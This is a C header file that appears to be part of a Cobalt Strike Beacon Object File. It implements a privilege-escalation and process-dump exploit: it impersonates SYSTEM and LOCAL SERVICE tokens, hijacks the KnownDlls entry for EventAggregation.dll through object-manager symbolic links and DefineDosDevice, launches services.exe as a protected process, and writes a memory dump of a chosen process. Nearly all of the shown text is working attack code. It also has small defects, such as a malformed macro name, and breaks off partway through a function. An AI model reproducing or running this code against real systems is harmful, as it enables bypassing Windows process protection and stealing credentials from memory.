#pragma once

#include <windows.h>
#include <aclapi.h>
#include "syscalls.h"
#include "api_functions.h"
#include "ntdll.h"
#include "tdefs.h"
#include "beacon.h"
#include "utils.h"
#include "fileheader.h"

#define PPL_BINARY L"services.exe"
#define DLL_TO_HIJACK_WIN10 L"EventAggregation.dll"

#define DEFAULT_DUMP_FILE L"C:\\Windows\\System32\\output.dmp"

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH MISMATCH ((NTSTATUS)0xC0000004L)
#endif

///////////////////////////////
// Extern "global" variables //
///////////////////////////////
extern DWORD pid;
extern WCHAR wcPID[];
extern BOOL  forceDosDeviceCreation;
extern BOOL  gVerbose;
extern BOOL  gDebug;
extern FUNCTION_POINTER_STRUCT sFunctionPointerStruct;
extern HMODULE hmKernel32ModuleHandle;
extern HMODULE hmAdvapi32ModuleHandle;

/////////////////////////
// Function prototypes //
/////////////////////////
BOOL DumpProcess(_In_ DWORD dwProcessId, _In_ LPWSTR pwszFilePath);
BOOL DumpProcessByName(_In_ LPWSTR pwszProcessName, _In_ LPWSTR pwszFilePath);
BOOL CheckRequirements();
BOOL EnableRequisitePrivileges();
BOOL RevertPrivilege();
BOOL IsCurrentUserSystem(OUT PBOOL pbResult);
BOOL GetHijackableDllName(OUT LPWSTR* ppwszDllName);
BOOL ImpersonateSystem(OUT PHANDLE phSystemToken);
BOOL ImpersonateUser(IN LPCWSTR pwszSid, OUT PHANDLE phToken, __in_opt LPCWSTR pwszPrivileges[], IN DWORD dwPrivilegeCount); //Partially done
BOOL FindProcessTokenAndDuplicate(IN LPCWSTR pwszTargetSid, OUT PHANDLE phToken, __in_opt LPCWSTR pwszPrivileges[], IN DWORD dwPrivilegeCount); // Might be good?
BOOL Impersonate(IN HANDLE hToken);
BOOL ImpersonateLocalService(_Out_ PHANDLE phLocalServiceToken);
BOOL CheckKnownDllSymbolicLink(IN LPCWSTR pwszDllName, IN LPWSTR pwszTarget);
BOOL MapDll(IN LPWSTR pwszSectionName, OUT PHANDLE phSection);
BOOL WritePayloadDllTransacted(OUT PHANDLE pdhFile);
BOOL FindFileForTransaction(IN DWORD dwMinSize, OUT LPWSTR* ppwszFilePath);
BOOL UnmapDll(IN HANDLE hSection);
BOOL PrepareCommandLine(IN DWORD dwProcessId, IN LPWSTR pwszFilePath, IN LPWSTR pwszRandomGuid, OUT LPWSTR* ppwszCommandLine);
BOOL CreateProtectedProcessAsUser(IN HANDLE hToken, IN LPWSTR pwszCommandLine, OUT PHANDLE phProcess);


/////////////////////
// Implementations //
/////////////////////
BOOL DumpProcess(DWORD dwProcessId, LPWSTR pwszFilePath) {
	BOOL bReturnValue = FALSE;

	BOOL bCurrentUserIsSystem = FALSE;
	HANDLE hSystemToken = NULL;
	BOOL bImpersonationActive = FALSE;

	LPCWSTR pwszKnownDllsObjDir = L"\\GLOBAL??\\KnownDlls";
	HANDLE hKnownDllsObjDir = NULL;

	LPWSTR pwszDllToHijack = NULL;
	LPWSTR pwszDllLinkName = NULL;
	HANDLE hDllLink = NULL;
	SECURITY_DESCRIPTOR sd = { 0 };
	SECURITY_ATTRIBUTES sa = { 0 };

	LPCWSTR pwszFakeGlobalrootLinkName = L"\\??\\GLOBALROOT";
	LPCWSTR pwszFakeGlobalrootLinkTarget = L"\\GLOBAL??";
	HANDLE hFakeGlobalrootLink = NULL;
	HANDLE hLocalServiceToken = NULL;

	LPWSTR pwszDosDeviceName = NULL;
	LPWSTR pwszDosDeviceTargetPath = NULL;

	LPWSTR pwszSectionName = NULL;
	HANDLE hDllSection = NULL;

	LPWSTR pwszCommandLine = NULL;
	HANDLE hCurrentToken = NULL;
	HANDLE hNewProcessToken = NULL;
	HANDLE hNewProcess = NULL;
	DWORD dwExitCode = 0;

	HANDLE hEventDllLoaded = NULL, hEventDumpSuccess = NULL;
	BOOL bDllLoaded = FALSE;
    BOOL bDumpSuccess = FALSE;
	WCHAR wszEventName[MAX_PATH] = { 0 };
    WCHAR wszEventNameSecond[MAX_PATH] = { 0 };
	LPWSTR pwszGuid = NULL;
	DWORD dwWait = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "Is system? %s\n", bCurrentUserIsSystem ? "True" : "False");

    BOOL bRequirementsSatisfied = CheckRequirements();

    if (bRequirementsSatisfied != TRUE) {
        BeaconPrintf(CALLBACK_ERROR, "Prerequisities have not been adequately satisfied. Exiting!\n");
        goto end;

    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Prerequisites have been satisfied, continuing! :)\n");
    }

    // Allocate the local pointer to match the intended path for a DLL of this Windows version
    if ( !GetHijackableDllName(&pwszDllToHijack) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in acquiring heap string for DLL path in GetHijackableDllName (DumpProcess): 0x%08x", sFunctionPointerStruct.StructGetLastError());
        goto end;
    } else {
        // Check our dereference:
        BeaconPrintf(CALLBACK_OUTPUT, "Hijackable DLL: %ls\n", (wchar_t*)pwszDllToHijack);
    }

    if ( !IsCurrentUserSystem(&bCurrentUserIsSystem) ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Checking IsCurrentUserSystem in DumpProcess (exploit.h)\n");
        goto end;
    }

    if ( !bCurrentUserIsSystem ) {
        if ( !ImpersonateSystem(&hSystemToken) ) {
            BeaconPrintf(CALLBACK_ERROR, "Error from ImpersonateSystem call in DumpProcess (exploit.h)\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Successfully impersonated system! :)\n");
        }

        bImpersonationActive = TRUE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Create Object Directory string: %ls\n", (wchar_t*)pwszKnownDllsObjDir);

    hKnownDllsObjDir = ObjectManagerCreateDirectory(pwszKnownDllsObjDir);
    if (hKnownDllsObjDir != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Handle to ObjectManager: %p\n", hKnownDllsObjDir);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Handle from ObjectManager is NULL. Exiting\n");
        goto end;
    }


    ///////////////////////
    // Step 2
    ///////////////////////
    pwszDllLinkName = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    if ( !pwszDllLinkName ) {
        BeaconPrintf(CALLBACK_ERROR, "Unsuccessful in allocating heap size for pwszDllLinkName in DumpProcess. :(\n");
        goto end;
    }

    ///////////////////////
    // Hacky declaration //
    ///////////////////////
    WCHAR fd[10] = L"\\";

    MSVCRT$wcsncpy(pwszDllLinkName, pwszKnownDllsObjDir, sFunctionPointerStruct.StructlstrlenW(pwszKnownDllsObjDir));
    MSVCRT$wcsncat(pwszDllLinkName, fd, sFunctionPointerStruct.StructlstrlenW(fd));
    MSVCRT$wcsncat(pwszDllLinkName, pwszDllToHijack, sFunctionPointerStruct.StructlstrlenW(pwszDllToHijack));

    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to begin creating symbolic link with: %ls\n", (wchar_t*)pwszDllLinkName);

    hDllLink = ObjectManagerCreateSymlink(pwszDllLinkName, L"foo123");
    if (hDllLink != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Handle to ObjectManagerCreateSymlink result: %p\n", hDllLink);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Handle to ObjectManagerCreateSymlink result is NULL. Exiting\n");
        goto end;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Created symbolic link: %ls\n", (wchar_t*)pwszDllLinkName);


    ///////////////////////
    // Stage 3
    ///////////////////////

    if (bCurrentUserIsSystem) {
        sFunctionPointerStruct.StructInitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
        sFunctionPointerStruct.StructSetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

        sa.nLength = sizeof(sa);
        sa.bInheritHandle = FALSE;
        sa.lpSecurityDescriptor = &sd;

        BeaconPrintf(CALLBACK_OUTPUT, "Set a NULL DACL on %ls\n", (wchar_t*)pwszDllLinkName);

        if ( !sFunctionPointerStruct.StructSetKernelObjectSecurity(hDllLink, DACL_SECURITY_INFORMATION, &sd) ) {
            BeaconPrintf(CALLBACK_ERROR, "Unsuccessful call to SetKernelObjectSecurity in DumpProcess (exploit.h). Exiting\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Successful call to SetKernelObjectSecurity in DumpProcess (exploit.h).\n");
        }

        if ( !ImpersonateLocalService(&hLocalServiceToken) ) {
            BeaconPrintf(CALLBACK_ERROR, "Unsuccessful call to ImpersonateLocalService in DumpProcess (exploit.h). Exiting\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Successful call to ImpersonateLocalService in DumpProcess (exploit.h).\n");
        }

        bImpersonationActive = TRUE;

        BeaconPrintf(CALLBACK_OUTPUT, "Impersonating LOCAL SERVICE.\n");

    } else {
        if ( !sFunctionPointerStruct.StructRevertToSelf() ) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to revert to self after failed attempt to impersonate local service in DumpProcess (exploit.h).\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to revert to self after failed attempt to impersonate local service in DumpProcess (exploit.h).\n");

            bImpersonationActive = FALSE;
        }
    }
    
    BeaconPrintf(CALLBACK_OUTPUT, "Creating symbolic link: %ls -> %ls\n", (wchar_t*)pwszFakeGlobalrootLinkName, (wchar_t*)pwszFakeGlobalrootLinkTarget);

    hFakeGlobalrootLink = ObjectManagerCreateSymlink(pwszFakeGlobalrootLinkName, pwszFakeGlobalrootLinkTarget);
    if ( hFakeGlobalrootLink != NULL ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Created Symbolic Link Successfully: %ls -> %ls\n", (wchar_t*)pwszFakeGlobalrootLinkName, (wchar_t*)pwszFakeGlobalrootLinkTarget);
        BeaconPrintf(CALLBACK_OUTPUT, "Handle Value: %p\n", hFakeGlobalrootLink);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed call to ObjectManagerCreateSymlink for %ls -> %ls. Exiting.\n", (wchar_t*)pwszFakeGlobalrootLinkName, (wchar_t*)pwszFakeGlobalrootLinkTarget);
    }


    ///////////////////////
    // Stage 4
    ///////////////////////

    pwszDosDeviceName = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));
    pwszDosDeviceTargetPath = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, (MAX_PATH + 1) * sizeof(WCHAR));

    if ( !pwszDosDeviceName || !pwszDosDeviceTargetPath ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in heap allocations for pwszDosDeviceTargetPath or pswzDosDeviceName. Exiting\n");
        goto end;
    }

    // Silly declaration to wcsncpy
    WCHAR wcGlobalKnownDlls[] = L"GLOBALROOT\\KnownDlls\\";
    WCHAR wcKernelObjects[]   = L"\\KernelObjects\\";

    MSVCRT$wcsncpy(pwszDosDeviceName, wcGlobalKnownDlls, sFunctionPointerStruct.StructlstrlenW(wcGlobalKnownDlls));
    MSVCRT$wcsncat(pwszDosDeviceName, pwszDllToHijack, sFunctionPointerStruct.StructlstrlenW(pwszDllToHijack));

    MSVCRT$wcsncpy(pwszDosDeviceTargetPath, wcKernelObjects, sFunctionPointerStruct.StructlstrlenW(wcKernelObjects));
    MSVCRT$wcsncat(pwszDosDeviceTargetPath, pwszDllToHijack, sFunctionPointerStruct.StructlstrlenW(pwszDllToHijack));

    BeaconPrintf(CALLBACK_OUTPUT, "Preparing to call DefineDosDevice to create: \\KnownDlls\\%ls -> %ls\n", (wchar_t*)pwszDllToHijack, (wchar_t*)pwszDosDeviceTargetPath);

    if ( !sFunctionPointerStruct.StructDefineDosDeviceW(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, pwszDosDeviceName, pwszDosDeviceTargetPath) ) {
        if ( !forceDosDeviceCreation || sFunctionPointerStruct.StructGetLastError() != ERROR_ALREADY_EXISTS ) {
            BeaconPrintf(CALLBACK_ERROR, "Current directives are not enforcing creation of DOS device due to error in invotation. Exiting.\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Successful call to DefineDosDeviceW: %ls - %ls.\n", (wchar_t*)pwszDllToHijack, (wchar_t*)pwszDosDeviceTargetPath);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully created DOS device.\n");
    }

    if (bCurrentUserIsSystem) {
        if ( !sFunctionPointerStruct.StructRevertToSelf() ) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to revert to self. Exiting.\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Successfully reverted back to self for user context.\n");
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Attempting to impersonate SYSTEM for a second time!\n");

        if ( !Impersonate(hSystemToken) ) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate SYSTEM for a second time. Exiting.\n");
            goto end;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "Successful impersonation of SYSTEM for a second time.\n");
        }

        bImpersonationActive = TRUE;
    }

    if ( !CheckKnownDllSymbolicLink(pwszDllToHijack, pwszDosDeviceTargetPath) ) {
        BeaconPrintf(CALLBACK_ERROR, "Bailing following an unsuccessful CheckKnownDllSymbolicLink call.\n");
        goto end;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "The symbolic link appears valid: %ls -> %ls\n", (wchar_t*)pwszDllToHijack, (wchar_t*)pwszDosDeviceTargetPath);


    ///////////////////////
    // Stage 5
    ///////////////////////

    pwszSectionName = pwszDosDeviceTargetPath;

    BeaconPrintf(CALLBACK_OUTPUT, "Attempting to map DLL to section: %ls\n", pwszSectionName);

    if ( !MapDll(pwszSectionName, &hDllSection) ) {
        BeaconPrintf(CALLBACK_ERROR, "Did not successfully map our DLL.\n");
        goto end;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Successfully mapped target DLL.\n");

    MiscGenerateGuidString(&pwszGuid);


    
    WCHAR currentGlobal[] = L"Global\\";
    WCHAR currentDLLLoaded[] = L"_DLL_LOADED";
    WCHAR currentDumpSuccess[] = L"_DUMP_SUCCESS";

    MSVCRT$wcsncpy(wszEventName, currentGlobal, sFunctionPointerStruct.StructlstrlenW(pwszGuid));
    MSVCRT$wcsncat(wszEventName, pwszGuid, sFunctionPointerStruct.StructlstrlenW(pwszGuid));
    MSVCRT$wcsncat(wszEventName, currentDLLLoaded, sFunctionPointerStruct.StructlstrlenW(currentDLLLoaded));

    BeaconPrintf(CALLBACK_OUTPUT, "Event name to be executed: %ls.\n", (wchar_t*)wszEventName);

    hEventDllLoaded = KERNEL32$CreateEventW(NULL, TRUE, FALSE, wszEventName);
    if ( !hEventDllLoaded ) {
        BeaconPrintf(CALLBACK_ERROR, "Unsuccessful call to CreateEvent. Exiting.\n");
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successful call to CreateEvent.\n");
    }

    MSVCRT$wcsncpy(wszEventNameSecond, currentGlobal, sFunctionPointerStruct.StructlstrlenW(currentGlobal));
    MSVCRT$wcsncat(wszEventNameSecond, pwszGuid, sFunctionPointerStruct.StructlstrlenW(pwszGuid));
    MSVCRT$wcsncat(wszEventNameSecond, currentDumpSuccess, sFunctionPointerStruct.StructlstrlenW(currentDumpSuccess));

    hEventDumpSuccess = KERNEL32$CreateEventW(NULL, TRUE, FALSE, wszEventNameSecond);
    if ( !hEventDumpSuccess ) {
        BeaconPrintf(CALLBACK_ERROR, "Unsuccessful second call to CreateEvent. Exiting.\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successful second call to CreateEvent.\n");
    }
    

    ///////////////////////
    // Stage 6
    ///////////////////////
    if ( !PrepareCommandLine(dwProcessId, pwszFilePath, pwszGuid, &pwszCommandLine) ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create command line. Exiting\n");
        goto end;
    }

    if (bCurrentUserIsSystem) {
        if ( !sFunctionPointerStruct.StructOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES, &hCurrentToken) ) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to open process token in stage 6. Exiting.\n");
            goto end;
        }
    } else {
        if ( !sFunctionPointerStruct.StructOpenThreadToken(sFunctionPointerStruct.StructGetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ADJUST_PRIVILEGES, FALSE, &hCurrentToken) ) {
            BeaconPrintf(CALLBACK_ERROR, "Failed to open thread token in stage 6. Exiting.\n");
            goto end;
        }
    }

    if ( !TokenCheckPrivilege(hCurrentToken, L"SeAssignPrimaryTokenPrivilege", TRUE) ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to alter token (SeAssignPrimaryTokenPrivilege) in stage 6. Exiting.\n");
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully assigned SeAssignPrimaryTokenPrivilege.\n");
    }

    if ( !sFunctionPointerStruct.StructDuplicateTokenEx(hCurrentToken, MAXIMUM_ALLOWED, NULL, SecurityAnonymous, TokenPrimary, &hNewProcessToken) ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed DuplicateTokenEx call in stage 6. Exiting.\n");
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully duplicated token.\n");
    }

    if ( !CreateProtectedProcessAsUser(hNewProcessToken, pwszCommandLine, &hNewProcess) ) {
        goto end;
    }

    sFunctionPointerStruct.StructWaitForSingleObject(hNewProcess, INFINITE);

    bDllLoaded = sFunctionPointerStruct.StructWaitForSingleObject(hEventDllLoaded, 100) == WAIT_OBJECT_0;
    bDumpSuccess = sFunctionPointerStruct.StructWaitForSingleObject(hEventDumpSuccess, 100) == WAIT_OBJECT_0;

    BeaconPrintf(CALLBACK_OUTPUT, "Unmapping section: %ls\n", (wchar_t*)pwszSectionName);

    UnmapDll(hDllSection);

    if ( !KERNEL32$GetExitCodeProcess(hNewProcess, &dwExitCode) ) {
        BeaconPrintf(CALLBACK_ERROR, "Did not successfully retrieve the exit code of the prior process. Exiting.\n");
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Retrieved error code: %d\n", dwExitCode);
    }

    bReturnValue = bDumpSuccess;

    if (bDumpSuccess) {
        BeaconPrintf(CALLBACK_OUTPUT, "Dump successful! Dump should be at: %ls\n", DEFAULT_DUMP_FILE);
    } else {
        if (bDllLoaded) {
            BeaconPrintf(CALLBACK_ERROR, "The DLL was loaded but something went wrong.\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "The DLL was not loaded.\n");
        }
    }    

    end:
        if (bImpersonationActive)
            sFunctionPointerStruct.StructRevertToSelf();
        if (hEventDllLoaded)
            NtClose(hEventDllLoaded);
        if (hEventDumpSuccess)
            NtClose(hEventDumpSuccess);
        if (pwszGuid)
            sFunctionPointerStruct.StructLocalFree(pwszGuid);
        if (hNewProcessToken)
            NtClose(hNewProcessToken);
        if (pwszCommandLine)
            sFunctionPointerStruct.StructLocalFree(pwszCommandLine);
        if (pwszDosDeviceName)
            sFunctionPointerStruct.StructLocalFree(pwszDosDeviceName);
        if (pwszDosDeviceTargetPath)
            sFunctionPointerStruct.StructLocalFree(pwszDosDeviceTargetPath);
        if (hDllLink)
            NtClose(hDllLink);
        if (pwszDllLinkName)
            sFunctionPointerStruct.StructLocalFree(pwszDllLinkName);
        if (hKnownDllsObjDir)
            NtClose(hKnownDllsObjDir);
        if (hLocalServiceToken)
            NtClose(hLocalServiceToken);
        if (hSystemToken)
            NtClose(hSystemToken);
        if (pwszDllToHijack)
            sFunctionPointerStruct.StructLocalFree(pwszDllToHijack);

        return bReturnValue;
}


BOOL CheckRequirements()
{
    BOOL bReturnValue = FALSE;
    BOOL getPrivs = EnableRequisitePrivileges();

    if (getPrivs == TRUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successful return of EnableRequisitePrivileges in CheckRequirements (exploit.h).\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Too many errors to continue!\n");

        return bReturnValue;
    }

    // Get Process Integrity Level
    DWORD dwCurrentIntegrityLevel = 0;

    BeaconPrintf(CALLBACK_OUTPUT, "Current PID: %d\n", sFunctionPointerStruct.StructGetCurrentProcessId());

    if (!ProcessGetIntegrityLevel(sFunctionPointerStruct.StructGetCurrentProcessId(), &dwCurrentIntegrityLevel)) {
        BeaconPrintf(CALLBACK_ERROR, "No integrity level. :(");
        return bReturnValue;
    } else {
        if (dwCurrentIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
            BeaconPrintf(CALLBACK_ERROR, "We are currently not in a high-enough integrity process.\n");
            return bReturnValue;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "We are in a process exceeding the minimum requirements.  Moving along!\n");
        }
    }

    if (sFunctionPointerStruct.StructGetFileAttributesW(DEFAULT_DUMP_FILE) != INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "This filepath for your dump already exists, please remove or supply a new path or name.\n");
        return bReturnValue;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "The filename supplied appears to be non-existant. This is good! :)\n");
    }

    BOOL bIsSystem = FALSE;
    IsCurrentUserSystem(&bIsSystem);

    if (bIsSystem) {
        BeaconPrintf(CALLBACK_OUTPUT, "Detected current beacon as running with SYSTEM privileges. :)\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Current beacon is not running as SYSTEM, more work will be necessitated. Never fear.\n");
    }


    return TRUE;
}


BOOL EnableRequisitePrivileges(void) {
    NTSTATUS judgement;
	DWORD dwFailCount = 0;
	HANDLE hProcessToken;
	HANDLE hTargetProcess = NULL;
	BOOL bIsSystem = FALSE;
	DWORD dwProcessId = 0;
	DWORD dwProcessProtectionLevel = 0;
	LPWSTR pwszProcessProtectionName = NULL;
	DWORD dwProcessIntegrityLevel = 0;
	LPCWSTR ppwszRequiredPrivileges[2] = { L"SeDebugPrivilege", L"SeImpersonatePrivilege" };

    judgement = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hProcessToken);
    if (judgement != STATUS_SUCCESS) {
        dwFailCount++;
        BeaconPrintf(CALLBACK_OUTPUT, "Error in ascertaining current user token.\n");
        NtClose(hProcessToken);

        return FALSE;
    } else {
        for (int i = 0; i < 2; i++) {
            TOKEN_PRIVILEGES tkp = { 0 };

            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            LPCWSTR lpwPrivilege = ppwszRequiredPrivileges[i];
            if (!sFunctionPointerStruct.StructLookupPrivilegeValueW(NULL, lpwPrivilege, &tkp.Privileges[0].Luid)) {
                NtClose(hProcessToken);
                return FALSE;
            }

            NTSTATUS tokenStatus = NtAdjustPrivilegesToken(hProcessToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

            if (tokenStatus != STATUS_SUCCESS) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to adjust the current process token privilege: %ls\n", (wchar_t*)ppwszRequiredPrivileges[i]);
                NtClose(hProcessToken);

                return FALSE;
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "Enabled: %ls\n", (wchar_t*)ppwszRequiredPrivileges[i]);
            }
        }
    }

    NtClose(hProcessToken);

    return TRUE;

}


BOOL RevertPrivilege()
{
    NTSTATUS judgement;
	DWORD dwFailCount = 0;
	HANDLE hProcessToken;
	HANDLE hTargetProcess = NULL;
	BOOL bIsSystem = FALSE;
	DWORD dwProcessId = 0;
	DWORD dwProcessProtectionLevel = 0;
	LPWSTR pwszProcessProtectionName = NULL;
	DWORD dwProcessIntegrityLevel = 0;
	LPCWSTR ppwszRequiredPrivileges[2] = { L"SeDebugPrivilege", L"SeImpersonatePrivilege" };

    judgement = NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hProcessToken);
    if (judgement != STATUS_SUCCESS) {
        dwFailCount++;
        BeaconPrintf(CALLBACK_OUTPUT, "Error in ascertaining. Returning :(\n");

        return FALSE;
    } else {
        for (int i = 0; i < 2; i++) {
            TOKEN_PRIVILEGES tkp = { 0 };

            tkp.PrivilegeCount = 1;
            tkp.Privileges[0].Attributes = NULL;

            LPCWSTR lpwPrivilege = ppwszRequiredPrivileges[i];
            if (!sFunctionPointerStruct.StructLookupPrivilegeValueW(NULL, lpwPrivilege, &tkp.Privileges[0].Luid)) {
                NtClose(hProcessToken);
                return FALSE;
            }

            NTSTATUS tokenStatus = NtAdjustPrivilegesToken(hProcessToken, FALSE, &tkp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);

            if (tokenStatus != STATUS_SUCCESS) {
                BeaconPrintf(CALLBACK_ERROR, "Failed to adjust the current process token privilege: %ls\n", (wchar_t*)ppwszRequiredPrivileges[i]);
                NtClose(hProcessToken);

                return FALSE;
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "Disabled: %ls\n", (wchar_t*)ppwszRequiredPrivileges[i]);
            }
        }
    }

    NtClose(hProcessToken);

    return TRUE;
}


BOOL IsCurrentUserSystem(OUT PBOOL pbResult) {
    BOOL bReturnValue = FALSE;
    HANDLE hProcessToken = NULL;
    LPWSTR pwszStringSid = NULL;

    if ((NTSTATUS)NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &hProcessToken) != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error in retrieiving current process token in IsCurrentUserSystem (exploit.h).\n");
        goto end;
    }

   if ( !TokenGetSidAsString(hProcessToken, &pwszStringSid) ) {
       BeaconPrintf(CALLBACK_ERROR, "Error in TokenGetSidAsString in IsCurrentUserSystem (exploit.h).\n");
       goto end;
   }

   *pbResult = MSVCRT$_wcsicmp(pwszStringSid, L"S-1-5-18") == 0;

   //Debugging
   BeaconPrintf(CALLBACK_OUTPUT, "Current SID: %ls\n", pwszStringSid);

   bReturnValue = TRUE;

    end:
        if (pwszStringSid) {
            sFunctionPointerStruct.StructLocalFree(pwszStringSid);
        }
        if (hProcessToken) {
            NtClose(hProcessToken);
        }

        return bReturnValue;
}


BOOL GetHijackableDllName(OUT LPWSTR* ppwszDllName) {

    if (!ppwszDllName) {
        return FALSE;
    }

    *ppwszDllName = (LPWSTR)sFunctionPointerStruct.StructLocalAlloc(LPTR, 64 * sizeof(WCHAR));
    if (!*ppwszDllName) {
        return FALSE;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Local Heap Allocated Pointer: 0x%p\n", *ppwszDllName);
    }

    wchar_t hijackableDLLName[] = DLL_TO_HIJACK_WIN10;

    BeaconPrintf(CALLBACK_OUTPUT, "Current Pointer: %ls\n", (wchar_t*)hijackableDLLName);
    BeaconPrintf(CALLBACK_OUTPUT, "Size: %d\n", sizeof(hijackableDLLName));

    MSVCRT$wcsncpy(*ppwszDllName, hijackableDLLName, 64);

    BeaconPrintf(CALLBACK_OUTPUT, "String?: %ls\n", (wchar_t*)*ppwszDllName);

    return TRUE;
}


BOOL ImpersonateSystem(OUT PHANDLE phSystemToken) {
    LPCWSTR pwszPrivileges[2] = { L"SeDebugPrivilege", L"SeAssignPrimaryTokenPrivilege" };

    return ImpersonateUser(L"S-1-5-18", phSystemToken, pwszPrivileges, sizeof(pwszPrivileges) / sizeof(*pwszPrivileges));
}


BOOL ImpersonateUser(IN LPCWSTR pwszSid, OUT PHANDLE phToken, __in_opt LPCWSTR pwszPrivileges[], IN DWORD dwPrivilegeCount) {
    BOOL bReturnValue = FALSE;
    HANDLE hCurrentProcessToken = NULL;
    HANDLE hToken = NULL;
    HANDLE hCurrentThread = NULL;
    NTSTATUS lwNTResult;

    lwNTResult = NtOpenProcessToken(NtCurrentProcess(), MAXIMUM_ALLOWED, &hCurrentProcessToken);
    if (lwNTResult != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Error in ImpersonateUser's NtOpenProcessToken call (exploit.h). Exiting\n");
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successful process token opened in ImpersonateUser's NtOpenProcessToken call (exploit.h).\n");
    }

    if ( !TokenCheckPrivilege(hCurrentProcessToken, L"SeDebugPrivilege", TRUE) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in TokenCheckPrivilege call from ImpersonateUser (exploit.h) 1: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successful TokenCheckPrivilege call from ImpersonateUser (exploit.h) for SeDebug.\n");
    }

    if ( !TokenCheckPrivilege(hCurrentProcessToken, L"SeImpersonatePrivilege", TRUE) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in second TokenCheckPrivilege call from ImpersonateUser (exploit.h) 2: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successful TokenCheckPrivilege call from ImpersonateUser (exploit.h) for SeImpersonatePrivilege.\n");
    }

    if ( !FindProcessTokenAndDuplicate(pwszSid, &hToken, pwszPrivileges, dwPrivilegeCount) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in second FindProcessTokenAndDuplicate call from ImpersonateUser (exploit.h) 3: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
        goto end;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Sucessfully found and duplicated process token.\n");
    }

    if ( !Impersonate(hToken) ) {
        BeaconPrintf(CALLBACK_ERROR, "Error in second Impersonate call from ImpersonateUser (exploit.h) 4: 0x%08x\n", sFunctionPointerStruct.StructGetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "Sucessfully impersonated deisred process token.\n");
    }

